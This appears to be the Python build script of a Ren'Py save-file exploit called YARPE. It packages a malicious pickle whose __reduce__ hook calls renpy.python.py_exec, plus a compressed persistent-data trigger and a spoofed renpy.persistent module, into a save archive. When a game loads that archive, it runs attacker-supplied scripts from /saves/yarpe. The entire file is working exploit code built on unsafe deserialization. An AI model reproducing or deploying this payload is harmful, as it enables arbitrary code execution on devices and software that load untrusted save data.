import pickle
import renpy
import zipfile
import os
import struct

version = os.getenv("YARPE_VERSION", "custom build")

SCRIPT = """
import sys
import traceback
sys.path.insert(0, "/saves/yarpe")

import constants
from constants import VERSION
from utils.rp import log, log_exc

constants.rp = renpy

try:
    log("=== YET ANOTHER RENPY EXPLOIT " + VERSION + " ===")
    scope = dict(globals(), **locals())
    execfile("/saves/yarpe/main.py")
except Exception as exc:
    exc_msg = traceback.format_exc()
    log_exc(exc_msg)
"""


import sys
import types
import zlib

class Yummy(object):
    def __reduce__(self):
        return renpy.python.py_exec, (SCRIPT,)

PERSISTENT_SCRIPT = """
import os
import sys
import traceback

try:
    execfile("/saves/yarpe/persistent_bootstrap.py")
except Exception as exc:
    try:
        f = open("/saves/yarpe_persistent_error.txt", "w")
        f.write(traceback.format_exc())
        f.close()
    except Exception:
        pass
"""

class YummyPersistent(object):
    def __reduce__(self):
        return renpy.python.py_exec, (PERSISTENT_SCRIPT,)

class DummyPersistent(object):
    pass
DummyPersistent.__module__ = "renpy.persistent"
DummyPersistent.__name__ = "Persistent"
DummyPersistent.__qualname__ = "Persistent"

sys.modules["renpy.persistent"] = types.ModuleType("renpy.persistent")
sys.modules["renpy.persistent"].Persistent = DummyPersistent

def list_files(start_path):
    all_files = []
    for root, _, files in os.walk(start_path):
        for file in files:
            all_files.append(os.path.join(root, file))
    return all_files


def scan_src_directory():
    files = []
    PREFIX = "./src"

    for filename in list_files(PREFIX):
        mod_time = int(os.path.getmtime(filename))
        rel_path = "/saves/yarpe/" + filename[len(PREFIX) + 1 :]

        files.append((rel_path, mod_time))

    files.sort(key=lambda x: x[0])
    return files


def create_saveindex(files, output_path):
    with open(output_path, "wb") as f:
        f.write(struct.pack("<I", len(files)))

        for filepath, timestamp in files:
            f.write(struct.pack("<II", timestamp, 0))
            filename_bytes = filepath.encode("utf-8")
            f.write(struct.pack("<I", len(filename_bytes)))
            f.write(filename_bytes)
            f.write(b"\x00")


def main():
    with open("src/version.txt", "w") as f:
        f.write(version)

    pickled = pickle.dumps(Yummy(), protocol=2)
    with open("savegame_container/log", "wb") as f:
        f.write(pickled)

    with zipfile.ZipFile("1-1-LT1.save", "w") as zip:
        zip.write("savegame_container/extra_info", "extra_info")
        zip.write("savegame_container/json", "json")
        zip.write("savegame_container/log", "log")
        zip.write("savegame_container/renpy_version", "renpy_version")
        zip.write("savegame_container/screenshot.png", "screenshot.png")
    src_files = scan_src_directory()

    if not src_files:
        print("No files found to index!")
        return

    src_files.append(("/saves/1-1-LT1.save", int(os.path.getmtime("1-1-LT1.save"))))
    src_files.append(("/saves/persistent", 0))

    output_path = "-saveindex"
    create_saveindex(src_files, output_path)

    p = DummyPersistent()
    p.yarpe_trigger = YummyPersistent()
    pickled_persistent = pickle.dumps(p, protocol=2)
    compressed_persistent = zlib.compress(pickled_persistent)
    with open("persistent", "wb") as f:
        f.write(compressed_persistent)

    with zipfile.ZipFile("save.zip", "w") as zipf:
        zipf.write(output_path, "-saveindex")
        zipf.write("1-1-LT1.save", "1-1-LT1.save")
        zipf.write("persistent", "persistent")
        for filepath, _ in src_files:
            if filepath in ["/saves/1-1-LT1.save", "/saves/persistent"]:
                continue

            split_path = filepath[7:].split("/")
            zip_path = "".join(
                [
                    ("_%s_" % x) if i != len(split_path) - 1 else x
                    for i, x in enumerate(split_path)
                ]
            )
            local_path = "src/" + filepath[7:][len("yarpe/") :]
            zipf.write(local_path, zip_path)


if __name__ == "__main__":
    main()
